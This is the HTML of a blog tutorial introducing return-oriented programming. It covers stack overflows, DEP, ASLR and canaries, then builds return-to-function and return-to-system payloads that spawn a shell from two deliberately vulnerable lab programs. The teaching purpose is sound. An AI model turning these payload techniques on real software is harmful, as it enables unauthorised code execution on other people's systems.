@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="ROP is an exploit technique in which the attacker uses control of the stack to indirectly execute cherry-picked instructions or groups of machine instructions immediately prior to the return instructi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Introduction to Return Oriented Programming (ROP)">
+<meta property="og:url" content="http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/index.html">
+<meta property="og:site_name" content="Ketansingh.net">
+<meta property="og:description" content="ROP is an exploit technique in which the attacker uses control of the stack to indirectly execute cherry-picked instructions or groups of machine instructions immediately prior to the return instructi">
+<meta property="og:image" content="https://i.imgur.com/wyLXD4K.png">
+<meta property="og:image" content="http://imgur.com/3Xrk5zw.png">
+<meta property="og:image" content="https://i.imgur.com/QJpKPLe.png">
+<meta property="og:updated_time" content="2017-02-25T13:06:01.513Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Introduction to Return Oriented Programming (ROP)">
+<meta name="twitter:description" content="ROP is an exploit technique in which the attacker uses control of the stack to indirectly execute cherry-picked instructions or groups of machine instructions immediately prior to the return instructi">
+<meta name="twitter:image" content="https://i.imgur.com/wyLXD4K.png">
+<meta name="twitter:creator" content="@http://twitter.com/sh_ketan">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Introduction to Return Oriented Programming (ROP)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/make-executable-harder-to-recover-from-memory/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&text=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&is_video=false&description=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Introduction to Return Oriented Programming (ROP)&body=Check out this article: http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&name=Introduction to Return Oriented Programming (ROP)&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Brief-revision-of-classic-buffer-overflow"><span class="toc-number">1.</span> <span class="toc-text">Brief revision of classic buffer overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NX-DEP"><span class="toc-number">1.1.</span> <span class="toc-text">NX/DEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR"><span class="toc-number">1.2.</span> <span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Canaries"><span class="toc-number">1.3.</span> <span class="toc-text">Stack Canaries</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oritented-Programming"><span class="toc-number">2.</span> <span class="toc-text">Return Oritented Programming</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Let’s-control-the-EIP"><span class="toc-number">3.</span> <span class="toc-text">Let’s control the EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Calling-conventions"><span class="toc-number">4.</span> <span class="toc-text">Calling conventions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Constructing-our-own-stack-frame"><span class="toc-number">5.</span> <span class="toc-text">Constructing our own stack frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Introduction to Return Oriented Programming (ROP)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Ketansingh.net</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-02-25T12:45:53.000Z" itemprop="datePublished">2017-02-25</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/C/">C</a>, <a class="tag-link" href="/tags/aslr/">aslr</a>, <a class="tag-link" href="/tags/dep/">dep</a>, <a class="tag-link" href="/tags/exploit/">exploit</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>ROP is an exploit technique in which the attacker uses control of the stack to indirectly execute cherry-picked instructions or groups of machine instructions immediately prior to the return instruction in subroutines within the existing program code.<br>Because all the instructions that are executed are from executable memory areas within the original program, this avoids the need for direct code injection, and circumvents most measures that try to prevent the execution of instructions from user-controlled memory.<br>Thus, ROP reuses code in the existing program to perform exploitation, evading memory protection mechanisms. I’ll assume reader is aware of how basic stack overflow exploit works.</p>
+<h2 id="Brief-revision-of-classic-buffer-overflow"><a href="#Brief-revision-of-classic-buffer-overflow" class="headerlink" title="Brief revision of classic buffer overflow"></a>Brief revision of classic buffer overflow</h2><p>Consider the following program</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</div><div class="line">   <span class="keyword">char</span> buffer[<span class="number">10</span>];</div><div class="line">   read(<span class="number">0</span>,buffer,<span class="number">100</span>);</div><div class="line">   <span class="built_in">puts</span>(buffer);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">   vuln();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>This program is vulnerable to classic buffer overflow attack. In the <code>vul()</code> we have buffer of <em>10</em> bytes while we are reading upto <em>100</em> bytes in the <code>read()</code> since writing more data than what is allowed, it can lead to buffer overflow.</p>
+<p>when <code>vuln()</code> is called, stack might look somewhat like</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">ADDRESS       DATA</div><div class="line"></div><div class="line">0xbfff0000    XX XX XX XX  &lt;- buffer </div><div class="line"></div><div class="line">0xbfff0004    XX XX XX XX </div><div class="line"></div><div class="line">0xbfff0008    XX XX XX XX </div><div class="line"></div><div class="line">0xbfff000c    XX XX XX XX </div><div class="line"></div><div class="line">........</div><div class="line"></div><div class="line"></div><div class="line">0xbfff0020    YY YY YY YY  &lt;- saved EBP address</div><div class="line"></div><div class="line">0xbfff0024    ZZ ZZ ZZ ZZ  &lt;- return address</div></pre></td></tr></table></figure>
+<p>When buffer is filled with just the right size it’s possible to modify saved return address allowing attacker to take control of EIP thus allowing him to execute any arbitrary code.</p>
+<p>In modern systems this can be evaded by </p>
+<ul>
+<li>ALSR </li>
+<li>Stack Canaries</li>
+<li>NX/DEP</li>
+</ul>
+<h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX/DEP"></a>NX/DEP</h3><p>DEP stands for data execution prevention, this technique marks areas of memory as non executable. Usually the stack and heap are marked as non executable thus preventing attacker from executing code residing in these regions of memory.</p>
+<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>ASLR stands for Address Space Layer Randomization. This technique randomizes address of memory where shared libraries , stack and heap are maapped at. This prevent attacker from predicting where to take EIP , since attacker does not knows address of his malicious payload. </p>
+<h3 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h3><p>In this technique compiler places a randomized guard value after stack frame’s local variables and before the saved return address. This guard is checked before function returns if it’s not same then program exits. It can be visualized as</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">ADDRESS       DATA</div><div class="line"></div><div class="line">0xbfff0000    XX XX XX XX  &lt;- buffer </div><div class="line"></div><div class="line">0xbfff0004    XX XX XX XX </div><div class="line"></div><div class="line">0xbfff0008    XX XX XX XX </div><div class="line"></div><div class="line">0xbfff000c    CC CC CC CC  &lt;- stack canary</div><div class="line"></div><div class="line">........</div><div class="line"></div><div class="line"></div><div class="line">0xbfff0020    YY YY YY YY  &lt;- saved EBP address</div><div class="line"></div><div class="line">0xbfff0024    ZZ ZZ ZZ ZZ  &lt;- return address</div></pre></td></tr></table></figure>
+<p>If an attacker tries to modify return address, stack canary is also modified inevitably. So, before function returns this canary is checked thus preventing the exploitation.</p>
+<h2 id="Return-Oritented-Programming"><a href="#Return-Oritented-Programming" class="headerlink" title="Return Oritented Programming"></a>Return Oritented Programming</h2><p>ROP is a complex technique that allows us to bypass DEP and ALSR but unfortunately (or fortunately) this cannot bypass stack canary protection however if there’s an additional memory leak it may be possible to predict canary and exploit it.<br>ROP re-uses executable code portions within the binary or shared libraries. These code portions are often called as ‘ROP Gadgets’. We’ll have a look at special case of ROP called as Return2PLT . It should be noted that only libc base address is randomized, offset of a particular function from its base address always remains constant, If we can bypass shared library base address randomization, vulnerable programs can be successfully exploited even when ASLR is turned on.</p>
+<p>Let’s consider this vulnerable code </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">grant</span><span class="params">()</span> </span>&#123;</div><div class="line">   system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploitable</span><span class="params">()</span> </span>&#123;</div><div class="line">   <span class="keyword">char</span> buffer[<span class="number">16</span>];</div><div class="line">   <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buffer);</div><div class="line">   <span class="keyword">if</span>(<span class="built_in">strcmp</span>(buffer,<span class="string">"pwned"</span>) == <span class="number">0</span>) grant();</div><div class="line">   <span class="keyword">else</span>  <span class="built_in">puts</span>(<span class="string">"Nice try\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">   exploitable();</div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Since we cannot bypass stack canaries using this method, this program should be compiled with flag telling compiler to turn off stack protector</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ gcc hack_me_2.c -o hack_me_2 -fno-stack-protector -m32</div></pre></td></tr></table></figure>
+<p>reading the programs’s memory mapping we can we see that it’s stack is read/write only<br>and not executable.</p>
+<p><img src="https://i.imgur.com/wyLXD4K.png" alt="MAP"></p>
+<h2 id="Let’s-control-the-EIP"><a href="#Let’s-control-the-EIP" class="headerlink" title="Let’s control the EIP"></a>Let’s control the EIP</h2><p>Since scanf does not performs bound checking , we can control by EIP by overwriting return address of the function to point to some known location. I will try to point it to <code>grant()</code>. we can obtain address of <code>grant</code> using objdump</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ objdump <span class="_">-d</span> ./hack_me_2 | grep grant</div></pre></td></tr></table></figure>
+<p>It should look like<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">080484cb &lt;grant&gt;:</div><div class="line"> 8048516:       e8 b0 ff ff ff          call   80484cb &lt;grant&gt;</div></pre></td></tr></table></figure></p>
+<p>Not let’s modify this function’s return address to <code>grant()</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ (python -c <span class="string">'print "A"*28 + "\xcb\x84\x04\x08" '</span>; cat -) | ./hack_me_2</div></pre></td></tr></table></figure>
+<p>(Note endianess)</p>
+<p>This should spawn a shell.</p>
+<p>Well obviously most program will not call shell for you this easily, we need to modify program a little to be more realistic</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">grant</span><span class="params">()</span> </span>&#123;</div><div class="line">   system(<span class="string">"cowsay try again"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploitable</span><span class="params">()</span> </span>&#123;</div><div class="line">   <span class="keyword">char</span> buffer[<span class="number">16</span>];</div><div class="line">   <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buffer);</div><div class="line">   <span class="keyword">if</span>(<span class="built_in">strcmp</span>(buffer,<span class="string">"pwned"</span>) == <span class="number">0</span>) grant();</div><div class="line">   <span class="keyword">else</span>  <span class="built_in">puts</span>(<span class="string">"Nice try\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">   exploitable();</div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>using previous exploit we get </p>
+<p><img src="http://imgur.com/3Xrk5zw.png" alt="cowsay"></p>
+<p>But how do we call <code>system(&quot;/bin/sh&quot;)</code> now?</p>
+<h2 id="Calling-conventions"><a href="#Calling-conventions" class="headerlink" title="Calling conventions"></a>Calling conventions</h2><p>When disassembled our code looks like</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">080484cb &lt;grant&gt;:</div><div class="line"> 80484cb:       55                      push   %ebp</div><div class="line"> 80484cc:       89 e5                   mov    %esp,%ebp</div><div class="line"> 80484ce:       83 ec 08                sub    $0x8,%esp</div><div class="line"> 80484d1:       83 ec 0c                sub    $0xc,%esp</div><div class="line"> 80484d4:       68 e8 85 04 08          push   $0x80485e8</div><div class="line"> 80484d9:       e8 b2 fe ff ff          call   8048390 &lt;system@plt&gt;</div><div class="line"> 80484de:       83 c4 10                add    $0x10,%esp</div><div class="line"> 80484e1:       90                      nop</div><div class="line"> 80484e2:       c9                      leave</div><div class="line"> 80484e3:       c3                      ret</div><div class="line"></div><div class="line">080484e4 &lt;exploitable&gt;:</div><div class="line"> 8048516:       e8 b0 ff ff ff          call   80484cb &lt;grant&gt;</div><div class="line"> 804851b:       eb 10                   jmp    804852d &lt;exploitable+0x49&gt;</div></pre></td></tr></table></figure>
+<p>let’s look briefly what each instruction does.</p>
+<p>In exploitable we call grant() using <code>call</code> instruction which does two things, it pushes next address that is <code>0x0804851b</code> to the stack and changes <code>EIP</code> to the address <code>0x080484cb</code> which is where grant() is located.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">push   %ebp    </div><div class="line">mov %esp,%ebp</div></pre></td></tr></table></figure>
+<p>This is function prolouge. It sets up stack frame for current function. It saves base pointer of stack of previous stack frame by pushing it and then changes current base pointer to stack pointer ($ebp = $esp). Now grant() can use it’s stack to store variables and whatnot.<br>After that it allocates space on stack for local variables by subtracting from esp (since stack grows down) and finally pushes address <code>0x080485e8</code><br>on the stack before calling <code>system()</code> which is pointer to string which will be passed as argument to <code>system()</code> , It somewhat looks like</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">system(*<span class="number">0x80485e8</span>)</div></pre></td></tr></table></figure>
+<p>This is called as function calling convention in x86. After <code>system()</code> returns stack is restored using leave which does opposite of function prolouge that is<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">esp = esp</div><div class="line">pop ebp</div></pre></td></tr></table></figure></p>
+<p>finally <code>RET</code> pops the value from top of the stack into EIP which is saved return address of the function</p>
+<h2 id="Constructing-our-own-stack-frame"><a href="#Constructing-our-own-stack-frame" class="headerlink" title="Constructing our own stack frame"></a>Constructing our own stack frame</h2><p>We’ve seen how stack behaves when function is called , which means</p>
+<ul>
+<li>We can construct our own stack frames</li>
+<li>Control parameters to a function we jump to</li>
+<li>Decide where this function returns to</li>
+<li>If we control the stack between these two we can control return function’s parameters too</li>
+<li>Repeating this lets us chain multiple function</li>
+</ul>
+<p>from objdump we see that address of “/bin/sh” is <code>0x080485E0</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ objdump -s -j .rodata hack_me_3</div><div class="line"></div><div class="line">hack_me_3:     file format elf32-i386</div><div class="line"></div><div class="line">Contents of section .rodata:</div><div class="line"> 80485d8 03000000 01000200 2f62696e 2f736800  ......../bin/sh.</div><div class="line"> 80485e8 636f7773 61792074 72792061 6761696e  cowsay try again</div><div class="line"> 80485f8 00257300 70776e65 64004e69 63652074  .%s.pwned.Nice t</div><div class="line"> 8048608 72790a00                             ry..</div></pre></td></tr></table></figure>
+<p>we’ll return to <code>system()</code> by modifying return address of <code>exploitable()</code> and construct “fake” stack frame for our function <code>system()</code>, the stack will look like</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ADDRESS       DATA</div><div class="line"></div><div class="line"></div><div class="line">........</div><div class="line"> // exploitable() stack</div><div class="line">0xbfff0004    80 48 4d 90  &lt;- return address</div><div class="line">// our frame</div><div class="line">0xbfff0008    41 41 41 41  &lt;- saved return pointer, system()</div><div class="line">0xbfff000c    08 04 85 E0  &lt;- &quot;/bin/sh&quot;</div></pre></td></tr></table></figure>
+<p>So , when exploitable() returns it goes to system() which will see return address as <code>41414141</code> and argument as “/bin/sh”, which will spawn a shell but when it returns<br>it will pop <code>41414141</code> to EIP but as expected will segfault but if it were a valid address we can chain them up as long as they do not need parameters. So , to exploit it </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ (python -c &apos;print &quot;A&quot;*28 + &quot;\x90\x83\x04\x08&quot; + &quot;\x41\x41\x41\x41&quot; + &quot;\xE0\x85\x04\x08&quot; &apos;; cat -) | ./hack_me_3</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/QJpKPLe.png" alt="done"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://sploitfun.wordpress.com/" target="_blank" rel="external">https://sploitfun.wordpress.com/</a></p>
+<p><a href="https://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/" target="_blank" rel="external">https://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/</a></p>
+<p><a href="https://crypto.stanford.edu/~blynn/rop/" target="_blank" rel="external">https://crypto.stanford.edu/~blynn/rop/</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Brief-revision-of-classic-buffer-overflow"><span class="toc-number">1.</span> <span class="toc-text">Brief revision of classic buffer overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NX-DEP"><span class="toc-number">1.1.</span> <span class="toc-text">NX/DEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR"><span class="toc-number">1.2.</span> <span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Canaries"><span class="toc-number">1.3.</span> <span class="toc-text">Stack Canaries</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oritented-Programming"><span class="toc-number">2.</span> <span class="toc-text">Return Oritented Programming</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Let’s-control-the-EIP"><span class="toc-number">3.</span> <span class="toc-text">Let’s control the EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Calling-conventions"><span class="toc-number">4.</span> <span class="toc-text">Calling conventions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Constructing-our-own-stack-frame"><span class="toc-number">5.</span> <span class="toc-text">Constructing our own stack frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&text=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&is_video=false&description=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Introduction to Return Oriented Programming (ROP)&body=Check out this article: http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/&title=Introduction to Return Oriented Programming (ROP)"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
